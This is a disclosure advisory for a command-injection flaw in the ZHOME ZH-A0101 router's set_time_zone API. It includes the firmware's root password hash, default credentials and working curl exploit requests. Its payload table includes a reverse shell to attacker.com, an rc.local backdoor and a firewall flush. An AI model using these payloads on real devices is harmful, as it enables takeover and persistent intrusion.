# Command Injection Vulnerability in ZHOME ZH-A0101 set_time_zone via `hostname`

## Overview

- **Vendor:** Ziroom
- **Product:** ZHOME-A0101
- **Firmware Version:** 1.0.1.0, Build 202004151405
- **Platform:** OpenWrt / MediaTek MT7621, MIPS32
- **Vulnerability Type:** Command Injection
- **Affected Endpoint:** `POST /api/ZRFirmware/set_time_zone`
- **Affected Parameter:** `hostname`
- **Authentication Requirement:** HTTP Basic Auth as `root`
- **Severity:** Critical

## Vulnerability Information

| Item                | Detail                                           |
| ------------------- | ------------------------------------------------ |
| File                | `usr/lib/lua/luci/controller/api/zrFirmware.lua` |
| Function            | `set_time_zone()`                                |
| Code Location       | line 443-475                                     |
| Injection Location  | line 457, line 465                               |
| Endpoint            | `POST /api/ZRFirmware/set_time_zone`             |
| Injection Parameter | `hostname`                                       |
| Authentication      | HTTP Basic Auth (`root`)                         |

## Vulnerable Code
<img width="1509" height="1050" alt="image" src="https://github.com/user-attachments/assets/475c172f-ce7f-4449-82f1-b05480806efe" />

```lua
-- zrFirmware.lua line 449-465
local zonename = LuciHttp.formvalue("zonename")
local hostname = LuciHttp.formvalue("hostname")
if ZRFun.isStrNil(hostname) then hostname = "ZR" end

local cmd = string.format("grep -w %s /usr/lib/lua/luci/sys/zoneinfo/tzdata.lua |awk '{print $3}'", zonename)
local tz = ZRFirmwareFun.trim(LuciUtil.exec(cmd))

if not ZRFun.isStrNil(zonename) and not ZRFun.isStrNil(tz) then
    local expr,tblist='',{}
    expr = string.format("uci set system.@system[0].hostname=%s", hostname)
    table.insert(tblist, expr)

    for _,v in pairs(tblist) do
        v = v .. " &>/dev/null "
        os.execute(v)
    end
end
```

The `hostname` parameter is directly concatenated into a shell command and later executed by `os.execute()`. Because no quoting or escaping is applied, shell metacharacters can terminate the original command and append attacker-controlled commands.

## Exploit Chain

```text
Attacker
 |
 |-- Step 1: Obtain the root credential.
 |           The firmware contains an MD5 password hash:
 |           $1$SD.FRa1K$D8O0ttaPTFvEs0i.0W.Co.
 |
 |-- Step 2: Send an authenticated POST request.
 |           URL:
 |           http://192.168.18.1/cgi-bin/luci/;stok=<STOK>/api/ZRFirmware/set_time_zone
 |           Body:
 |           zonename=Asia/Shanghai&hostname=<PAYLOAD>
 |
 |-- Step 3: Inject through the hostname parameter.
 |           Normal value:
 |           hostname=RCE
 |
 |           Normal command:
 |           uci set system.@system[0].hostname=RCE
 |
 |           Injected value:
 |           hostname=RCE;touch /tmp/vuln04.txt
 |
 |           Final command:
 |           uci set system.@system[0].hostname=RCE;touch /tmp/vuln04.txt &>/dev/null
 |
 `-- Step 4: /bin/sh executes both commands.
             Command 1: uci set system.@system[0].hostname=RCE
             Command 2: touch /tmp/vuln04.txt
```

## Trigger Request

### Obtain `stok`

```bash
curl -s --noproxy "*" -c cookies.txt -X POST \
  "http://192.168.18.1/cgi-bin/luci" \
  -d "username=root&password=admin" \
  -L -D headers.txt

STOK=$(grep stok headers.txt | sed 's/.*stok=//;s/\r//')
```

### Execute the Injection

```bash
curl -s --noproxy "*" -b cookies.txt -X POST \
  --data-urlencode "zonename=Asia/Shanghai" \
  --data-urlencode "hostname=RCE;touch /tmp/vuln04.txt" \
  "http://192.168.18.1/cgi-bin/luci/;stok=${STOK}/api/ZRFirmware/set_time_zone"
```

### Execute an Arbitrary Command

```bash
curl -s --noproxy "*" -b cookies.txt -X POST \
  --data-urlencode "zonename=Asia/Shanghai" \
  --data-urlencode "hostname=RCE;id>/tmp/id_result.txt" \
  "http://192.168.18.1/cgi-bin/luci/;stok=${STOK}/api/ZRFirmware/set_time_zone"
```

## Verification

```bash
ssh -p 1022 root@192.168.18.1 "ls -la /tmp/vuln04.txt"
```
<img width="2037" height="264" alt="image" src="https://github.com/user-attachments/assets/4b1173ae-bbed-486e-9e33-cfa35e40ee85" />

## Exploitation Scenarios

| Scenario         | Payload                                        | Description                   |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| Create file      | `hostname=RCE;touch /tmp/test`                 | Verify command execution      |
| Write output     | `hostname=RCE;id>/tmp/id.txt`                  | Save command output to a file |
| Reverse shell    | `hostname=RCE;nc attacker.com 4444 -e /bin/sh` | Requires `nc` on the device   |
| Persistence      | `hostname=RCE;echo 'backdoor'>>/etc/rc.local`  | Execute on boot               |
| Disable firewall | `hostname=RCE;iptables -F`                     | Flush firewall rules          |


